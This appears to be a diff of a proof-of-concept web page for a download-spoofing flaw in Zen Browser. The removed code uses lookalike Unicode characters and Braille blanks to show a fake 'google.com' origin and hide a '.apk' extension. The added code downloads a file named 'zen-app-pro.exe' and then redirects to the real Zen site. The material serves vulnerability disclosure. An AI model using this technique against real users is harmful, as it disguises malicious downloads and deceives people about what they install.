@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Zen Browser — download origin spoof</title>
+<title>Poc Test Download Spoofing (zen-app-pro.exe)</title>
 <style>
   :root { color-scheme: dark; }
   body {
@@ -11,43 +11,33 @@
     background: #0d0f12; color: #e6e8eb;
     font: 15px/1.6 system-ui, -apple-system, "Segoe UI", sans-serif;
   }
-  main { width: min(560px, 92vw); padding: 40px 0; }
+  main { width: min(560px, 92vw); padding: 40px 0; text-align: center; }
   h1 { font-size: 20px; margin: 0 0 8px; }
-  p { color: #9aa3ad; margin: 0 0 20px; }
+  p { color: #9aa3ad; margin: 0 0 24px; }
   button {
-    padding: 12px 20px; font: inherit; font-weight: 600; cursor: pointer;
+    padding: 12px 22px; font: inherit; font-weight: 600; cursor: pointer;
     color: #0d0f12; background: #e6e8eb; border: 0; border-radius: 8px;
   }
   button:hover { background: #fff; }
-  pre {
-    background: #14181d; border: 1px solid #232a32; border-radius: 8px;
-    padding: 14px 16px; overflow-x: auto; margin: 20px 0 0;
-    font: 13px ui-monospace, Consolas, monospace;
-  }
 </style>
 </head>
 <body>
 <main>
-  <h1>Download origin spoof</h1>
-  <p>Zen Browser 1.24.2b — the download list shows a fake origin and hides the real extension.</p>
-
+  <h1>Poc Test Download Spoofing (zen-app-pro.exe)</h1>
+  <p>Click to download. The page then opens the Zen site.</p>
   <button id="go">Download</button>
-
-  <pre id="name"></pre>
 </main>
 
 <script>
-  // U+2236 RATIO, U+2215 DIVISION SLASH x2, U+2800 BRAILLE PATTERN BLANK x40
-  const NAME = "https\u2236\u2215\u2215google.com" + "\u2800".repeat(40) + ".apk";
-
-  document.getElementById("name").textContent = NAME;
-
   document.getElementById("go").onclick = () => {
-    const blob = new Blob(["x"], { type: "application/octet-stream" });
     const a = document.createElement("a");
-    a.href = URL.createObjectURL(blob);
-    a.download = NAME;
+    a.href = "data:,https://zen-browser.app";
+    a.download = "zen-app-pro.exe";
     a.click();
+
+    setTimeout(() => {
+      location.href = "https://zen-browser.app/";
+    }, 2000);
   };
 </script>
 </body>
